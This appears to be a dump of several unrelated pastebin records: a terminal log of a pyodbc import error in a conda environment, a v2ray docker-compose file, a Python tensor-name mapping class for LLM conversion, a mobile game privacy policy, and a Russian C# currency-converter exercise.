stack_data                0.6.2              pyhd8ed1ab_0    conda-forge
tk                        8.6.12               h5d9f67b_0
tornado                   6.3.3           py311h2725bcf_1    conda-forge
traitlets                 5.13.0             pyhd8ed1ab_0    conda-forge
typing_extensions         4.8.0              pyha770c72_0    conda-forge
tzdata                    2023c                h04d1e81_0
urllib3                   2.1.0                    pypi_0    pypi
wcwidth                   0.2.10             pyhd8ed1ab_0    conda-forge
wheel                     0.41.2          py311hecd8cb5_0
xz                        5.4.2                h6c40b1e_0
zeromq                    4.3.5                h93d8f39_0    conda-forge
zipp                      3.17.0             pyhd8ed1ab_0    conda-forge
zlib                      1.2.13               h4dc903c_0
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:12:31
~/Doc/PY/J/AICORE/AZURE >   brew install unixodbc                                          py azureenv 16:13:58
==> Downloading https://formulae.brew.sh/api/formula.jws.json
######################################################################################################### 100.0%
==> Downloading https://formulae.brew.sh/api/cask.jws.json
######################################################################################################### 100.0%
Warning: unixodbc 2.3.12 is already installed and up-to-date.
To reinstall 2.3.12, run:
  brew reinstall unixodbc
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:14:01
~/Doc/PY/J/AICORE/AZURE > pip install --no-binary :all: pyodbc                             py azureenv 16:14:02
Collecting pyodbc
  Using cached pyodbc-5.0.1-cp311-cp311-macosx_10_9_x86_64.whl
Installing collected packages: pyodbc
Successfully installed pyodbc-5.0.1
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:15:00
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:15:01
~/Doc/PY/J/AICORE/AZURE > conda list                                                       py azureenv 16:15:01
# packages in environment at /Users/kip/miniconda/envs/azureenv:
#
# Name                    Version                   Build  Channel
appnope                   0.1.3              pyhd8ed1ab_0    conda-forge
asttokens                 2.4.1              pyhd8ed1ab_0    conda-forge
azure-core                1.29.5                   pypi_0    pypi
azure-storage-blob        12.19.0                  pypi_0    pypi
backports                 1.0                pyhd8ed1ab_3    conda-forge
backports.functools_lru_cache 1.6.5              pyhd8ed1ab_0    conda-forge
bzip2                     1.0.8                h1de35cc_0
ca-certificates           2023.11.17           h8857fd0_0    conda-forge
certifi                   2023.11.17               pypi_0    pypi
cffi                      1.16.0                   pypi_0    pypi
charset-normalizer        3.3.2                    pypi_0    pypi
comm                      0.1.4              pyhd8ed1ab_0    conda-forge
cryptography              41.0.5                   pypi_0    pypi
debugpy                   1.8.0           py311hdf8f085_1    conda-forge
decorator                 5.1.1              pyhd8ed1ab_0    conda-forge
exceptiongroup            1.1.3              pyhd8ed1ab_0    conda-forge
executing                 2.0.1              pyhd8ed1ab_0    conda-forge
idna                      3.4                      pypi_0    pypi
importlib-metadata        6.8.0              pyha770c72_0    conda-forge
importlib_metadata        6.8.0                hd8ed1ab_0    conda-forge
ipykernel                 6.26.0             pyh3cd1d5f_0    conda-forge
ipython                   8.17.2             pyh31c8845_0    conda-forge
isodate                   0.6.1                    pypi_0    pypi
jedi                      0.19.1             pyhd8ed1ab_0    conda-forge
jupyter_client            8.6.0              pyhd8ed1ab_0    conda-forge
jupyter_core              5.5.0           py311h6eed73b_0    conda-forge
libcxx                    16.0.6               hd57cbcb_0    conda-forge
libffi                    3.4.4                hecd8cb5_0
libsodium                 1.0.18               hbcb3906_1    conda-forge
matplotlib-inline         0.1.6              pyhd8ed1ab_0    conda-forge
ncurses                   6.4                  hcec6c5f_0
nest-asyncio              1.5.8              pyhd8ed1ab_0    conda-forge
openssl                   3.1.4                hd75f5a5_0    conda-forge
packaging                 23.2               pyhd8ed1ab_0    conda-forge
parso                     0.8.3              pyhd8ed1ab_0    conda-forge
pexpect                   4.8.0              pyh1a96a4e_2    conda-forge
pickleshare               0.7.5                   py_1003    conda-forge
pip                       23.3            py311hecd8cb5_0
platformdirs              4.0.0              pyhd8ed1ab_0    conda-forge
prompt-toolkit            3.0.41             pyha770c72_0    conda-forge
prompt_toolkit            3.0.41               hd8ed1ab_0    conda-forge
psutil                    5.9.5           py311h2725bcf_1    conda-forge
ptyprocess                0.7.0              pyhd3deb0d_0    conda-forge
pure_eval                 0.2.2              pyhd8ed1ab_0    conda-forge
pycparser                 2.21                     pypi_0    pypi
pygments                  2.17.1             pyhd8ed1ab_0    conda-forge
pyodbc                    5.0.1                    pypi_0    pypi
python                    3.11.5               hf27a42d_0
python-dateutil           2.8.2              pyhd8ed1ab_0    conda-forge
python_abi                3.11                    2_cp311    conda-forge
pyzmq                     25.1.1          py311he3804a1_2    conda-forge
readline                  8.2                  hca72f7f_0
requests                  2.31.0                   pypi_0    pypi
setuptools                68.0.0          py311hecd8cb5_0
six                       1.16.0             pyh6c4a22f_0    conda-forge
sqlite                    3.41.2               h6c40b1e_0
stack_data                0.6.2              pyhd8ed1ab_0    conda-forge
tk                        8.6.12               h5d9f67b_0
tornado                   6.3.3           py311h2725bcf_1    conda-forge
traitlets                 5.13.0             pyhd8ed1ab_0    conda-forge
typing_extensions         4.8.0              pyha770c72_0    conda-forge
tzdata                    2023c                h04d1e81_0
urllib3                   2.1.0                    pypi_0    pypi
wcwidth                   0.2.10             pyhd8ed1ab_0    conda-forge
wheel                     0.41.2          py311hecd8cb5_0
xz                        5.4.2                h6c40b1e_0
zeromq                    4.3.5                h93d8f39_0    conda-forge
zipp                      3.17.0             pyhd8ed1ab_0    conda-forge
zlib                      1.2.13               h4dc903c_0
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:15:06
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:15:10
~/Doc/PY/J/AICORE/AZURE > ls                                                               py azureenv 16:15:10
accessing.ipynb	accessing.py	sql.py		sql2.py		sql2.zip	sql2b.py	sql3.py
~/Doc/PY/J/AICORE/AZURE > python3 ./sql2.py                                                py azureenv 16:15:10
Traceback (most recent call last):
  File ""/Users/kip/Documents/PYTHON/JUPYTER_ROOT/AICORE/AZURE/./sql2.py"", line 1, in <module>
    import pyodbc
ImportError: dlopen(/Users/kip/miniconda/envs/azureenv/lib/python3.11/site-packages/pyodbc.cpython-311-darwin.so, 0x0002): symbol not found in flat namespace (_SQLAllocHandle)
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:15:19
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:15:19
~/Doc/PY/J/AICORE/AZURE > python3 ./sql2b.py                                               py azureenv 16:15:20
Traceback (most recent call last):
  File ""/Users/kip/Documents/PYTHON/JUPYTER_ROOT/AICORE/AZURE/./sql2b.py"", line 1, in <module>
    import pyodbc
ImportError: dlopen(/Users/kip/miniconda/envs/azureenv/lib/python3.11/site-packages/pyodbc.cpython-311-darwin.so, 0x0002): symbol not found in flat namespace (_SQLAllocHandle)
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:15:22
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:15:23
~/Doc/PY/J/AICORE/AZURE > python3 ./sql3.py                                                py azureenv 16:15:23
Traceback (most recent call last):
  File ""/Users/kip/Documents/PYTHON/JUPYTER_ROOT/AICORE/AZURE/./sql3.py"", line 1, in <module>
    import pyodbc
ImportError: dlopen(/Users/kip/miniconda/envs/azureenv/lib/python3.11/site-packages/pyodbc.cpython-311-darwin.so, 0x0002): symbol not found in flat namespace (_SQLAllocHandle)
~/Doc/PY/J/AICORE/AZURE > >....
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:15:10
~/Doc/PY/J/AICORE/AZURE > ls                                                               py azureenv 16:15:10
accessing.ipynb accessing.py    sql.py          sql2.py         sql2.zip        sql2b.py        sql3.py
~/Doc/PY/J/AICORE/AZURE > python3 ./sql2.py                                                py azureenv 16:15:10
Traceback (most recent call last):
  File ""/Users/kip/Documents/PYTHON/JUPYTER_ROOT/AICORE/AZURE/./sql2.py"", line 1, in <module>
    import pyodbc
ImportError: dlopen(/Users/kip/miniconda/envs/azureenv/lib/python3.11/site-packages/pyodbc.cpython-311-darwin.so, 0x0002): symbol not found in flat namespace (_SQLAllocHandle)
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:15:19
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:15:19
~/Doc/PY/J/AICORE/AZURE > python3 ./sql2b.py                                               py azureenv 16:15:20
Traceback (most recent call last):
  File ""/Users/kip/Documents/PYTHON/JUPYTER_ROOT/AICORE/AZURE/./sql2b.py"", line 1, in <module>
    import pyodbc
ImportError: dlopen(/Users/kip/miniconda/envs/azureenv/lib/python3.11/site-packages/pyodbc.cpython-311-darwin.so, 0x0002): symbol not found in flat namespace (_SQLAllocHandle)
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:15:22
~/Doc/PY/J/AICORE/AZURE >                                                                  py azureenv 16:15:23
~/Doc/PY/J/AICORE/AZURE > python3 ./sql3.py                                                py azureenv 16:15:23
Traceback (most recent call last):
  File ""/Users/kip/Documents/PYTHON/JUPYTER_ROOT/AICORE/AZURE/./sql3.py"", line 1, in <module>
    import pyodbc
ImportError: dlopen(/Users/kip/miniconda/envs/azureenv/lib/python3.11/site-packages/pyodbc.cpython-311-darwin.so, 0x0002): symbol not found in flat namespace (_SQLAllocHandle)
~/Doc/PY/J/AICORE/AZURE >"
QyZR75Cj,V2ray on Docker Compose,primall,YAML,Tuesday 21st of November 2023 09:50:24 AM CDT,"version: '3'

services:
  v2ray:
    image: v2fly/v2fly-core
    command: run -c /etc/v2ray/config.json
    deploy:
      resources:
        limits:
          memory: 1000M
        reservations:
          memory: 500M
    #exposed ports is based on your config.json file
	ports:
      - 10086:10086
    environment:
      - TZ=Asia/Jakarta
      
    volumes:
	  #example for config reaad here: https://www.v2fly.org/en_US/guide/start.html#server
      - /etc/v2ray/config.json:/etc/v2ray/config.json"
Kicw8h8X,tensormap,tastypear,Python,Tuesday 21st of November 2023 09:47:21 AM CDT,"from __future__ import annotations

from typing import Sequence

from .constants import MODEL_ARCH, MODEL_TENSOR, MODEL_TENSORS, TENSOR_NAMES


class TensorNameMap:
    mappings_cfg: dict[MODEL_TENSOR, tuple[str, ...]] = {
        # Token embeddings
        MODEL_TENSOR.TOKEN_EMBD: (
            ""gpt_neox.embed_in"",                         # gptneox
            ""transformer.wte"",                           # gpt2 gpt-j mpt refact
            ""transformer.word_embeddings"",               # falcon
            ""word_embeddings"",                           # bloom
            ""model.embed_tokens"",                        # llama-hf
            ""tok_embeddings"",                            # llama-pth
            ""embeddings.word_embeddings"",                # bert
            ""language_model.embedding.word_embeddings"",  # persimmon
        ),

        # Token type embeddings
        MODEL_TENSOR.TOKEN_TYPES: (
            ""embeddings.token_type_embeddings"",  # bert
        ),

        # Normalization of token embeddings
        MODEL_TENSOR.TOKEN_EMBD_NORM: (
            ""word_embeddings_layernorm"",  # bloom
        ),

        # Position embeddings
        MODEL_TENSOR.POS_EMBD: (
            ""transformer.wpe"",                 # gpt2
            ""embeddings.position_embeddings"",  # bert
        ),

        # Output
        MODEL_TENSOR.OUTPUT: (
            ""embed_out"",                 # gptneox
            ""lm_head"",                   # gpt2 mpt falcon llama-hf baichuan
            ""output"",                    # llama-pth bloom
            ""word_embeddings_for_head"",  # persimmon
        ),

        # Output norm
        MODEL_TENSOR.OUTPUT_NORM: (
            ""gpt_neox.final_layer_norm"",               # gptneox
            ""model.embed_layer_norm"",                  # BlueLM
            ""transformer.ln_f"",                        # gpt2 gpt-j falcon
            ""model.norm"",                              # llama-hf baichuan
            ""norm"",                                    # llama-pth
            ""embeddings.LayerNorm"",                    # bert
            ""transformer.norm_f"",                      # mpt
            ""ln_f"",                                    # refact bloom
            ""language_model.encoder.final_layernorm"",  # persimmon
        ),

        # Rope frequencies
        MODEL_TENSOR.ROPE_FREQS: (
            ""rope.freqs"",  # llama-pth
        ),
    }

    block_mappings_cfg: dict[MODEL_TENSOR, tuple[str, ...]] = {
        # Attention norm
        MODEL_TENSOR.ATTN_NORM: (
            ""gpt_neox.layers.{bid}.input_layernorm"",                # gptneox
            ""transformer.h.{bid}.ln_1"",                             # gpt2 gpt-j refact
            ""transformer.blocks.{bid}.norm_1"",                      # mpt
            ""transformer.h.{bid}.input_layernorm"",                  # falcon7b
            ""h.{bid}.input_layernorm"",                              # bloom
            ""transformer.h.{bid}.ln_mlp"",                           # falcon40b
            ""model.layers.{bid}.input_layernorm"",                   # llama-hf
            ""layers.{bid}.attention_norm"",                          # llama-pth
            ""encoder.layer.{bid}.attention.output.LayerNorm"",       # bert
            ""language_model.encoder.layers.{bid}.input_layernorm"",  # persimmon
            ""model.layers.{bid}.ln1"",                               # yi
        ),

        # Attention norm 2
        MODEL_TENSOR.ATTN_NORM_2: (
            ""transformer.h.{bid}.ln_attn"",  # falcon40b
        ),

        # Attention query-key-value
        MODEL_TENSOR.ATTN_QKV: (
            ""gpt_neox.layers.{bid}.attention.query_key_value"",                     # gptneox
            ""transformer.h.{bid}.attn.c_attn"",                                     # gpt2
            ""transformer.blocks.{bid}.attn.Wqkv"",                                  # mpt
            ""transformer.h.{bid}.self_attention.query_key_value"",                  # falcon
            ""h.{bid}.self_attention.query_key_value"",                              # bloom
            ""language_model.encoder.layers.{bid}.self_attention.query_key_value"",  # persimmon
        ),

        # Attention query
        MODEL_TENSOR.ATTN_Q: (
            ""model.layers.{bid}.self_attn.q_proj"",       # llama-hf
            ""layers.{bid}.attention.wq"",                 # llama-pth
            ""encoder.layer.{bid}.attention.self.query"",  # bert
            ""transformer.h.{bid}.attn.q_proj"",           # gpt-j
        ),

        # Attention key
        MODEL_TENSOR.ATTN_K: (
            ""model.layers.{bid}.self_attn.k_proj"",     # llama-hf
            ""layers.{bid}.attention.wk"",               # llama-pth
            ""encoder.layer.{bid}.attention.self.key"",  # bert
            ""transformer.h.{bid}.attn.k_proj"",         # gpt-j
        ),

        # Attention value
        MODEL_TENSOR.ATTN_V: (
            ""model.layers.{bid}.self_attn.v_proj"",       # llama-hf
            ""layers.{bid}.attention.wv"",                 # llama-pth
            ""encoder.layer.{bid}.attention.self.value"",  # bert
            ""transformer.h.{bid}.attn.v_proj"",           # gpt-j
        ),

        # Attention output
        MODEL_TENSOR.ATTN_OUT: (
            ""gpt_neox.layers.{bid}.attention.dense"",                     # gptneox
            ""transformer.h.{bid}.attn.c_proj"",                           # gpt2 refact
            ""transformer.blocks.{bid}.attn.out_proj"",                    # mpt
            ""transformer.h.{bid}.self_attention.dense"",                  # falcon
            ""h.{bid}.self_attention.dense"",                              # bloom
            ""model.layers.{bid}.self_attn.o_proj"",                       # llama-hf
            ""layers.{bid}.attention.wo"",                                 # llama-pth
            ""encoder.layer.{bid}.attention.output.dense"",                # bert
            ""transformer.h.{bid}.attn.out_proj"",                         # gpt-j
            ""language_model.encoder.layers.{bid}.self_attention.dense"",  # persimmon
        ),

        # Rotary embeddings
        MODEL_TENSOR.ATTN_ROT_EMBD: (
            ""model.layers.{bid}.self_attn.rotary_emb.inv_freq"",   # llama-hf
            ""layers.{bid}.attention.inner_attention.rope.freqs"",  # llama-pth
        ),

        # Feed-forward norm
        MODEL_TENSOR.FFN_NORM: (
            ""gpt_neox.layers.{bid}.post_attention_layernorm"",                # gptneox
            ""transformer.h.{bid}.ln_2"",                                      # gpt2 refact
            ""h.{bid}.post_attention_layernorm"",                              # bloom
            ""transformer.blocks.{bid}.norm_2"",                               # mpt
            ""model.layers.{bid}.post_attention_layernorm"",                   # llama-hf
            ""layers.{bid}.ffn_norm"",                                         # llama-pth
            ""encoder.layer.{bid}.output.LayerNorm"",                          # bert
            ""language_model.encoder.layers.{bid}.post_attention_layernorm"",  # persimmon
            ""model.layers.{bid}.ln2"",                                        # yi
        ),

        # Feed-forward up
        MODEL_TENSOR.FFN_UP: (
            ""gpt_neox.layers.{bid}.mlp.dense_h_to_4h"",                # gptneox
            ""transformer.h.{bid}.mlp.c_fc"",                           # gpt2
            ""transformer.blocks.{bid}.ffn.up_proj"",                   # mpt
            ""transformer.h.{bid}.mlp.dense_h_to_4h"",                  # falcon
            ""h.{bid}.mlp.dense_h_to_4h"",                              # bloom
            ""model.layers.{bid}.mlp.up_proj"",                         # llama-hf refact
            ""layers.{bid}.feed_forward.w3"",                           # llama-pth
            ""encoder.layer.{bid}.intermediate.dense"",                 # bert
            ""transformer.h.{bid}.mlp.fc_in"",                          # gpt-j
            ""language_model.encoder.layers.{bid}.mlp.dense_h_to_4h"",  # persimmon
        ),

        # Feed-forward gate
        MODEL_TENSOR.FFN_GATE: (
            ""model.layers.{bid}.mlp.gate_proj"",  # llama-hf refact
            ""layers.{bid}.feed_forward.w1"",      # llama-pth
        ),

        # Feed-forward down
        MODEL_TENSOR.FFN_DOWN: (
            ""gpt_neox.layers.{bid}.mlp.dense_4h_to_h"",                # gptneox
            ""transformer.h.{bid}.mlp.c_proj"",                         # gpt2 refact
            ""transformer.blocks.{bid}.ffn.down_proj"",                 # mpt
            ""transformer.h.{bid}.mlp.dense_4h_to_h"",                  # falcon
            ""h.{bid}.mlp.dense_4h_to_h"",                              # bloom
            ""model.layers.{bid}.mlp.down_proj"",                       # llama-hf
            ""layers.{bid}.feed_forward.w2"",                           # llama-pth
            ""encoder.layer.{bid}.output.dense"",                       # bert
            ""transformer.h.{bid}.mlp.fc_out"",                         # gpt-j
            ""language_model.encoder.layers.{bid}.mlp.dense_4h_to_h"",  # persimmon
        ),

        MODEL_TENSOR.ATTN_Q_NORM: (
            ""language_model.encoder.layers.{bid}.self_attention.q_layernorm"",
        ),

        MODEL_TENSOR.ATTN_K_NORM: (
            ""language_model.encoder.layers.{bid}.self_attention.k_layernorm"",
        ),

        MODEL_TENSOR.ROPE_FREQS: (
            ""language_model.encoder.layers.{bid}.self_attention.rotary_emb.inv_freq"",  # persimmon
        ),
    }

    mapping: dict[str, tuple[MODEL_TENSOR, str]]

    def __init__(self, arch: MODEL_ARCH, n_blocks: int):
        self.mapping = {}
        for tensor, keys in self.mappings_cfg.items():
            if tensor not in MODEL_TENSORS[arch]:
                continue
            tensor_name = TENSOR_NAMES[tensor]
            self.mapping[tensor_name] = (tensor, tensor_name)
            for key in keys:
                self.mapping[key] = (tensor, tensor_name)
        for bid in range(n_blocks):
            for tensor, keys in self.block_mappings_cfg.items():
                if tensor not in MODEL_TENSORS[arch]:
                    continue
                tensor_name = TENSOR_NAMES[tensor].format(bid = bid)
                self.mapping[tensor_name] = (tensor, tensor_name)
                for key in keys:
                    key = key.format(bid = bid)
                    self.mapping[key] = (tensor, tensor_name)

    def get_type_and_name(self, key: str, try_suffixes: Sequence[str] = ()) -> tuple[MODEL_TENSOR, str] | None:
        result = self.mapping.get(key)
        if result is not None:
            return result
        for suffix in try_suffixes:
            if key.endswith(suffix):
                result = self.mapping.get(key[:-len(suffix)])
                if result is not None:
                    return result[0], result[1] + suffix
        return None

    def get_name(self, key: str, try_suffixes: Sequence[str] = ()) -> str | None:
        result = self.get_type_and_name(key, try_suffixes = try_suffixes)
        if result is None:
            return None
        return result[1]

    def get_type(self, key: str, try_suffixes: Sequence[str] = ()) -> MODEL_TENSOR | None:
        result = self.get_type_and_name(key, try_suffixes = try_suffixes)
        if result is None:
            return None
        return result[0]

    def __getitem__(self, key: str) -> str:
        try:
            return self.mapping[key][1]
        except KeyError:
            raise KeyError(key)

    def __contains__(self, key: str) -> bool:
        return key in self.mapping

    def __repr__(self) -> str:
        return repr(self.mapping)


def get_tensor_name_map(arch: MODEL_ARCH, n_blocks: int) -> TensorNameMap:
    return TensorNameMap(arch, n_blocks)"
qAvahBAK,57,ns3218,JSON,Tuesday 21st of November 2023 09:44:25 AM CDT,"Seven Spins Privacy Policy
 
The App is a free to play game, and in order to maintain the high quality and a great game experience we process information from and about you in particular to improve the entire experience in the App and to support internal operations.
 
Collection of information
Information we collect automatically through the app
 
When you access or use the App, we automatically collect general information about you, including:
 
    Log Information: We log information about your use of the App, including the type of device you use, the features you use, access times and your IP address.
    Device Information: We collect information about the device you use to access the App, including information about the device manufacture, device model, device's OS, time zone of device, language of device.
    Usage Information: We collect information relating to your use of the App, including your game progress, scores, achievements and interactions with other players.
    Consumption information: We collect information about your consumption habits relating to your use of the App, including which purchases you make with both virtual and real currencies and the reception of virtual goods in-game.
 
Information we collect from other sources
 
We use information about you for the following purposes in accordance with the legal bases for each type of personal data as described below:
 
    Log-, device-, usage-, and consumption information and device identifiers are being processed:
        to provide and deliver the products and services you request and send you related information as requested by you / as agreed with you;
        to provide and maintain the App and the game experience; and
 
        to send you technical notices, updates, security alerts, and support and administrative messages;
 
        Our processing for the above purposes is necessary for the performance of a contract to which you are party in order to support the operation of the App, facilitate the delivery of requested products and services and enable maintenance and update of the App, see Article 6(1)(b) of the GDPR.
        to provide news and information about the App that we think will be of interest to you;
        to personalize and improve the App and provide tailored content and features;
 
        to monitor and analyze trends, usage and activities in connection with the App;
 
        Our processing for the above purposes is justified by our legitimate interests in providing advertisements and content of interest to you and improving our services in accordance with Article 6(1)(f) of the GDPR (also known as ""the balancing-of-interest rule"").
 
        to provide users that have given us consent to share their advertising IDs with our ad network partners (as further specified under “Sharing of Information”) for the purpose of serving them with personalized advertisement in the App (behavioral advertising).
 
        Our processing for the above purpose is justified by our legitimate interests in providing advertisements and content of interest to you in accordance with Article 6(1)(f) of the GDPR. The disclosure of your advertising ID to third parties for the purposes of behavioral advertising is based on your consent in accordance with Article 6(1)(a) of the GDPR (see more below under Sharing of Information).
 
    Information from other sources are being processed:
 
        to provide and deliver the products and services you request and send you related information;
 
        Our processing for the above purpose is necessary for the performance of a contract to which you are party in order to facilitate the delivery of requested products and services, see Section 6(1)(b) of the GDPR.
        to link or combine information we get from others to help understand your needs and provide you with better service; and
 
        to provide news and information about the App we think will be of interest to you;
 
        Our processing for the above purposes is justified by our legitimate interests in providing content of interest to you and improving our services in accordance with Article 6(1)(f) of the GDPR (also known as ""the balancing-of-interest rule"").
 
We only process your information to the extent that is necessary to achieve the purposes for which the information has been collected.
Storage of information
 
Developer will store your personal data for as long as necessary in order to provide you with the App or otherwise fulfil the purposes as described above, unless further storage is required in order to establish, exercise or defend a legal claim or to comply with applicable law, including accounting rules.
 
Your personal data are deleted or anonymized as soon as it no longer serves one of the above mentioned purposes and in any event no later than three (3) years after your interaction with Developer has ceased.
Sharing of information
 
We disclose information about you to the following categories of recipients based on the legal bases under Sections 6(1)(b), 6(1)(c) and 6(1)(f) of the GDPR (see a description of the legal bases above):
 
    Social networks, see more under ""Social Sharing features"";
    Third parties if we are required to disclose your personal data by applicable law, rule, regulation, legal process or in connection with, or during negotiations of, any merger, sale of company assets, financing or acquisition of all or a portion of our business by another company;
    The authorities if we believe your actions are inconsistent with the spirit or language of our policies or if the disclosure is necessary to protect the rights, property and safety of Developer or others;
    Other players in order to provide certain in-app features, such as leaderboards, if you log into the App using a third-party service;
 
Furthermore, if you have given your consent in accordance with Section 6(1)(a) of the GDPR, we share your Device identifiers to advertising network companies for the purpose of them serving behavioral advertisements to you within the App. We use or may use the following advertising network companies:
 
    Google LLC https://policies.google.com/privacy
    Unity Technologies https://unity3d.com/legal/privacy-policy
    IronSource http://www.ironsrc.com/wp-content/uploads/2019/03/ironSource-Privacy-Policy.pdf
 
The recipients' use of the disclosed information will not be covered by this Privacy Policy. If you have questions concerning the processing carried out by such third parties, you should review their privacy policy.
 
In connection with our processing, we use following data processors such as server hosting providers, technical service providers for supporting internal operations, user login services and analytics service providers:
 
    Firebase (Google LLC) https://firebase.google.com/support/privacy
 
 
Children
 
Use of the App is limited to users aged 18 years and above.
 
Transfer to third countries
 
In connection with the processing, we will in certain circumstances transfer your personal data to recipients outside the EEU.
 
We only transfer personal data to entities in third countries that have provided appropriate safeguards to ensure that their level of data protection is in agreement with this Privacy Policy and applicable law.
 
Consequently, the transfers will only occur based on the following safeguards:
 
    If the entity is certified to comply with the principles for data protection under the US-EU Privacy Shield Framework (""Privacy Shield"") (you can view the entities certified under Privacy Shield at https://www.privacyshield.gov/), or
    If we have entered into standard data protection clauses adopted by the European Commission with the entity, which is deemed to offer sufficient safeguards with respect to the protection of the privacy and fundamental rights and freedoms of individuals.
 
Security
 
Developer takes reasonable measures to help protect information about you from loss, theft, misuse and unauthorized access, disclosure, alteration and destruction.
 
 
Does Developer actually ""sell"" personal data?
 
Developer does not, and will not, provide your personal data in direct exchange for money. Therefore, in the literal sense, Developer does not sell your data. However, we have disclosed some categories of personal data we collect, explained under ”Sharing of information“, to the third parties for business purpose as explained under “Use of information – purpose and legal basis”.
 
To the extent this practice is interpreted to constitute a “sale” under the CCPA, please contact us at info@say.games to exercise your right to withdraw your consent on sharing your personal data with third parties.
YOUR RIGHTS
Rights of EEU residents
 
We process and answer your requests without undue delay and in any event within one month of our receipt of the request unless a longer period is required due to the complexity of the request. In this case, our response time can be up to three months in total as permitted by Article 12 of the GDPR.
Right to request access
 
You have the right to request access into the data that we are processing on you, see Article 15 of the GDPR, including information about:
 
    the purposes of the processing;
    the categories of personal data concerned;
    the recipients or categories of recipient to whom the personal data have been or will be disclosed;
    the envisaged period for which the personal data will be stored.
 
Furthermore, you have the right to obtain a copy of the personal data undergoing processing. Please note that the access may be restricted due to intellectual property or trade secrets.
The right to object
 
You have the right to object to our processing of your personal data on grounds relating to your particular situation when the data are processed based on the balancing-of- interest rule in Section 6(1)(f) of the GDPR, see Article 21 of the GDPR. In this case, we will cease the processing unless there are compelling legitimate grounds for the processing which override your interests, rights and freedoms or if the processing is necessary for the establishment, exercise or defense of legal claims.
 
You have the right to object to our processing of your personal data for direct marketing purposes at any time. We will cease the processing of your personal data for this purpose after the objection.
Right to rectification
 
You have the right to have inaccurate personal data rectified, see Article 16 of the GDPR.
The right to restriction
 
You have the right to obtain restriction of processing in certain circumstances, see Article 18 of the GDPR. If you have the right to restriction, we will only process your data with your consent or for the establishment, exercise or defense of a legal claim or to protect a person or important grounds of public interest.
The right to withdraw consent
 
If we have asked for your consent to our processing of your data, you have the right to withdraw your consent at any time, see Article 7 of the GDPR.
 
If you withdraw your consent, we will cease processing of the data for which you have withdrawn consent, unless we have a legal obligation to keep some or parts of your data.
 
The withdrawal of your consent does not affect the lawfulness of processing based on your consent before its withdrawal.
The right to data portability
 
You have the right to receive the personal data you have provided us with which we process in a structured, commonly used and machine-readable format and have the right to transmit those data to another controller if the processing is based on consent or contract performance, see Article 20 of the GDPR.
Rights of California residents
 
We endeavor to respond to a verifiable consumer request within 45 days of its receipt. If we require more time (up to 90 days), we will inform you of the reason and extension period in writing. We will deliver our written response by mail.
 
Any disclosures we provide will only cover the 12-month period preceding the verifiable consumer request’s receipt. The response we provide will also explain the reasons we cannot comply with a request, if applicable. For data portability requests, we will select a format to provide your personal data that is readily useable and should allow you to transmit the information from one entity to another entity without hindrance.
Right to opt out
 
Under CCPA each California resident can request any business stops selling personal information to third parties.
Right to be informed
 
You have a right to be informed about what categories of personal data we are collecting, including the purpose of the collection. You can freely find this information in our Privacy Policy. We update our Privacy Policy at least once every 12 months.
Right to disclosure
 
You can request us to disclose what personal data we have collected on you in the past 12 months.
 
We can assure you that our Privacy Policy is an relevant document where you can find information about what personal data we have collected about you over the past 12 months and intend to collect, sources of your personal data and how we use your personal data.
 
You also have a right to get a free copy of your personal information disclosed in a readily usable and readable format (right of access). You can make this request for free, twice per year.
 
When providing information under the right of access, we will provide you with the following information:
 
    The categories of personal data we are collecting about you,
    The categories of sources of the personal data,
    The purpose for collecting your personal data,
    The categories of any third parties with whom we share your personal data,
    The specific pieces of personal data collected about you.
 
Right to deletion
 
You can request us to delete the personal data we have collected on you in the past 12 months.
 
We fully recognize you right to deletion, however, we would like to note that in some cases we are obliged to keep your personal data for certain period of time. For instance, if we need to provide services to you, detect or resolve issues security or functionality-related issues, comply with the law, conduct research in the public interest, safeguard the right to free speech or carry out any actions for internal purposes that you might reasonably expect. If we do not have obligations to perform any of the above actions, we can delete your personal information at your request.
Data Deletion Request
 
You may request Developer to erase without undue delay your personal data when it is no longer necessary for Developer to retain such data.
 
In order for your data to be erased you can contact Developer by info@say.games with request.
Right to equal services and prices
 
California residents are protected against any discrimination that a business might subject them to based on the exercising of their CCPA rights.
 
We will not discriminate against you for exercising any of your CCPA rights. Unless permitted by the CCPA, we will not:
 
    Deny you the App,
    Charge you different prices or rates for the App, including through granting discounts or other benefits, or imposing penalties,
    Provide you a different level or quality of the App,
    Suggest that you may receive a different price or rate for services or a different level or quality of the App.
 
How to exercise my rights
 
If you wish to use any of the rights described below, you may contact us at any time by emailing us at info@say.games.
 
Mandatory verification: We will need to verify your identity before processing your request. However, because you cannot create an account with the App, and you do not provide us with any information directly, we only collect information automatically, we may use limited verification methods. To verify your identity, we will generally require the matching data in our systems to the information we can process when you are making a request. In certain circumstances, we may decline the request, mainly where we are unable to verify your identity, for example, if you disable cookies, changed the device you used to access the App or you already requested us to delete your personal data.
Contact
 
Developer has the following contact information:
 
E-mail: mail@sevenspins57.com
 
You may also contact your local data protection authority for unresolved complaints.
"
8VE7QCRS,Untitled,Sininerebane,C#,Tuesday 21st of November 2023 09:40:11 AM CDT,"Задача
Написать конвертер валют (3 валюты).
У пользователя есть баланс в каждой из представленных валют. Он может попросить сконвертировать часть баланса с одной валюты в другую. Тогда у него с баланса одной валюты снимется X и зачислится на баланс другой Y. Курс конвертации должен быть просто прописан в программе.
По имени переменной курса конвертации должно быть понятно, из какой валюты в какую валюту конвертируется.
Должна выполняться однотипная операция или везде умножение ""*"" или деление ""/"". Для чего это нужно подробнее позже узнаете в разделе ""Функции"". Но придётся объявить коэффициенты на все случаи.
 
Программа должна завершиться тогда, когда это решит пользователь.
 
Дополнительно: Если решение строится на switch, то принято работать с константами (в остальных случаях объявляются переменные). Для каждого case следует объявить константу.
Пример:
const string CommandExit = ""exit"";
 
case CommandExit:
break;
 
